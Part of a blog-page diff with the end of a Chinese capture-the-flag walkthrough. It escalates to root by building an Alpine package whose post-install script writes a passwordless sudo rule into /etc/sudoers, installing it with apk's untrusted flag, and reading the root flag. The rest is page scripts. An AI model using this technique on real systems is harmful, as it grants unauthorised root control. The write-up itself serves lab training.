+cat <span class="pl-s"><span class="pl-k">&lt;&lt;</span> '<span class="pl-k">EOF</span>' &gt; APKBUILD</span>
+<span class="pl-s">pkgname=pwn</span>
+<span class="pl-s">pkgver=1.0.0</span>
+<span class="pl-s">pkgrel=0</span>
+<span class="pl-s">pkgdesc="pwn"</span>
+<span class="pl-s">arch="noarch"</span>
+<span class="pl-s">license="GPL"</span>
+<span class="pl-s">install="pwn.post-install"</span>
+<span class="pl-s">package() {</span>
+<span class="pl-s">    mkdir -p "$pkgdir"</span>
+<span class="pl-s">}</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span>
+
+<span class="pl-c"><span class="pl-c">#</span> 写入恶意安装后脚本 (例如：给予 superuser 完全的 sudo 权限)</span>
+cat <span class="pl-s"><span class="pl-k">&lt;&lt;</span> '<span class="pl-k">EOF</span>' &gt; pwn.post-install</span>
+<span class="pl-s">#!/bin/bash</span>
+<span class="pl-s">echo 'superuser ALL=(ALL:ALL) NOPASSWD: ALL' &gt;&gt; /etc/sudoers</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
+<ol start="2">
+<li><strong>生成签名密钥并构建包</strong><br>
+<code class="notranslate">abuild</code> 工具需要签名密钥来构建包。</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 生成密钥对</span>
+abuild-keygen -a
+<span class="pl-c"><span class="pl-c">#</span> 构建包</span>
+abuild checksum
+abuild -r</pre></div>
+<ol start="3">
+<li><strong>安装恶意包并提权</strong><br>
+使用 <code class="notranslate">sudo apk add</code> 并加上 <code class="notranslate">--allow-untrusted</code> 选项来安装我们自己构建的未签名包。</li>
+</ol>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo apk add --allow-untrusted /home/superuser/packages/tmp/x86_64/pwn-1.0.0-r0.apk </pre></div>
+<p>安装过程中，<code class="notranslate">pwn.post-install</code> 脚本会被 root 执行，<code class="notranslate">superuser</code> 用户现在拥有了无密码执行任何 <code class="notranslate">sudo</code> 命令的权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">localhost:/tmp/malicious-pkg$ sudo -l
+User superuser may run the following commands on localhost:
+    (ALL) NOPASSWD: /sbin/apk
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: ALL</pre></div>
+<ol start="4">
+<li>
+<p><strong>获取 Root Shell</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">localhost:/tmp/malicious-pkg$ sudo su
+/tmp/malicious-pkg <span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root),...</pre></div>
+</li>
+</ol>
+<p>最后，在 root 的家目录下找到最终的 flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">/tmp/malicious-pkg <span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
+flag{bd941f8fb8a7b5b1c34bd71a349d6d04}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
